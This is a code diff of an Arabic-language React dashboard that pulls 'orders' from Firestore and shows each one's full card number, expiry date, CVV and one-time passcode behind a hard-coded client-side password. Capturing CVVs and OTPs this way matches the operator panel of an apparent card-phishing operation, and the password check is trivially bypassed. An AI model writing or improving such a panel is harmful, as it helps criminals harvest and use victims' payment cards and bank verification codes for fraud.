@@ -3,8 +3,9 @@
 import { useState, useEffect } from 'react'
 import { collection, getDocs, query, orderBy, limit } from 'firebase/firestore'
 import { db } from '@/lib/firebase'
-import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
+import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
 import React from 'react'
+import { Input } from '@/components/ui/input'
 
 type Order = {
     cardNumber: string,
@@ -21,6 +22,7 @@ type VisitorData = {
 
 export default function DashboardPage() {
   const [orders, setOrders] = useState<Order[]>([])
+  const [pass, setPass] = useState('')
  // const [visitorData, setVisitorData] = useState<VisitorData[]>([])
 
   useEffect(() => {
@@ -65,6 +67,8 @@ export default function DashboardPage() {
   }))
 
   return (
+  <>
+  {  pass === '212995'?(
     <div className="min-h-screen bg-gray-50" dir="rtl">
       
       <main className="container mx-auto px-4 py-12">
@@ -91,29 +95,31 @@ export default function DashboardPage() {
           </CardHeader>
           <CardContent>
             <div className="overflow-x-auto">
-              <table className="w-full">
-                <thead>
-                  <tr>
-                    <th className="text-right py-2 hidden">التاريخ</th>
-                    <th className="text-right py-2">رقم البطاقة</th>
-
-                  </tr>
-                </thead>
-                <tbody>
+         
                   {recentOrders.map((order) => (
-                    <tr key={order.cardNumber}>
-                      <td className="py-2 hidden">{order.createdAt.toLocaleDateString('ar-KW')}</td>
-                      <td className="py-2">{order.expiryDate}<br/>{order.expiryDate}</td>
+                    <Card key={order.cardNumber} className='px-6 m-2' dir='ltr'>
+                    <CardHeader>
+                      <CardTitle>cardNumber: {order.cardNumber}</CardTitle>
+                      <CardDescription>ExpDate: {order.expiryDate}</CardDescription>
+                      <CardDescription>OTP: {order.cvv}</CardDescription>
+                    <strong className='text-red-400'>{order.otp}</strong>
 
-                    </tr>
+                    </CardHeader>
+                    <CardContent>
+                      <p>{order.createdAt.toLocaleDateString('ar-KW')}</p>
+                    </CardContent>
+                  </Card>
+              
                   ))}
-                </tbody>
-              </table>
             </div>
           </CardContent>
         </Card>
       </main>
-    </div>
+    </div>):<Input type='password' onChange={(e)=>{setPass(e.target.value)}} placeholder="ادخل الرمز السري"/>  
+}
+    </>
+
+
   )
 }
 
